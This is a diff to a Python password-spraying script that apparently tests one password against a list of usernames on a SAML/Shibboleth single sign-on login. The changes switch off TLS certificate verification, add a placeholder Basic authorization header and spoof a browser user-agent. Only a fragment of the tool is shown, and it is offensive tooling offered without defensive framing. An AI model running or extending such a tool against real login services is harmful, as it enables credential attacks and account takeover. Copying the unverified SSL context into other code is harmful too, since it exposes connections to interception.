@@ -9,6 +9,7 @@
 
 #basic script taken from: https://stackoverflow.com/questions/16512965/logging-into-saml-shibboleth-authenticated-server-using-python
 
+import urllib
 import urllib.request
 import urllib.parse
 import sys
@@ -30,11 +31,15 @@ class ShibRedirectHandler (urllib.request.HTTPRedirectHandler):
     def http_error_302(self, req, fp, code, msg, headers):
         return urllib.request.HTTPRedirectHandler.http_error_302(self,req,fp,code,msg,headers)
 
+context=ssl._create_unverified_context()
+
 print("Spraying Password: ",password)
 with open(userfile) as mf:
         for line in mf:
             cookieprocessor = urllib.request.HTTPCookieProcessor()
-            opener = urllib.request.build_opener(ShibRedirectHandler, cookieprocessor)
+            sslHandler = urllib.request.HTTPSHandler(context=context)
+            opener = urllib.request.build_opener(sslHandler, ShibRedirectHandler, cookieprocessor)
+            opener.addheaders = [("Authorization", "Basic 123ABC"),('User-agent', 'Mozilla/5.0')]
             print("==> Following Redirections for SAML2 Auth to the IDP")
             (opener.open(SP).read())
 
